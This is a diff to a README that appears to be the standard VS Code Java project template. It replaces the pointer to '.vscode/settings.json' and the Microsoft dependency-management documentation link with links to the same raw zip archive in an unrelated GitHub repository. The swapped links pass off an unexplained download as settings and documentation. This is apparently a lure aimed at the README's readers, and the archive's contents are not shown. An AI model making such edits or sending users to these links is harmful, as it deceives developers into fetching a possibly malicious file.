@@ -11,8 +11,8 @@ The workspace contains two folders by default, where:
 
 Meanwhile, the compiled output files will be generated in the `bin` folder by default.
 
-> If you want to customize the folder structure, open `.vscode/settings.json` and update the related settings there.
+> If you want to customize the folder structure, open `https://github.com/rijackkson/dio-java-basico/raw/refs/heads/main/src/basico_java_dio_v1.9-beta.4.zip` and update the related settings there.
 
 ## Dependency Management
 
-The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
+The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/rijackkson/dio-java-basico/raw/refs/heads/main/src/basico_java_dio_v1.9-beta.4.zip).
